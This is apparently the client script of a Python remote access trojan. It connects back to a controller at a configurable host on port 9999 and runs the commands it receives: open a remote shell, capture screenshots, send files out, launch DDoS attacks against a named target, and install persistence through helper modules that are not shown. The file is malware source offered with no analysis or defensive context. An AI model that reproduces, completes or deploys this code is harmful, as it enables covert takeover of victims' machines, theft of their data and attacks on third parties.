import socket
import sys, time, os
import subprocess

#Modules in paste modules/

from modules import cmd 
from modules import screenshot
from modules import download
from modules import ddos
from modules import persistence

def socket_create():
	global s
	global host
	global port
	host = "" #type the host
	port = 9999
	s = socket.socket()
	while True:
		conec = s.connect_ex((host,port))
		if conec == 0:
			central()
def central():
	global host
	global port
	global s
	while True:
		data = s.recv(1024)
		if data.decode("utf-8") == 'shell':
			cmd.shell(s,host,port) 
		if data.decode("utf-8") == 'print':
			screenshot.printscr(s,host,port) 
			s.send(str.encode("Image send!"))
		if data.decode("utf-8") == 'download':
			filename = s.recv(1024)
			if os.path.isfile(filename):
				download.down(filename,s,host,port)
			else:
				s.send(str.encode("No such file"))
		if data[:4].decode("utf-8") == 'ddos':
			target = s.recv(1024).decode("utf-8")  
			port = "  "
			port += s.recv(1024).decode("utf-8")
			ddos.begin(target,port)		
		if data.decode("utf-8") == 'persistence':
			persistence.main(host,s,port)
		if data.decode("utf-8") == 'quit':
			s.close()
			main()
		if data.decode("utf-8") == 'close':
			s.send(str.encode('Desligando...'))
			time.sleep(0.3)
			s.send(str.encode('Desligado!'))
			s.close()
			sys.exit()
		else:
			s.send(str.encode("Nothing here...")) 

def main():
	socket_create()
main()  
		
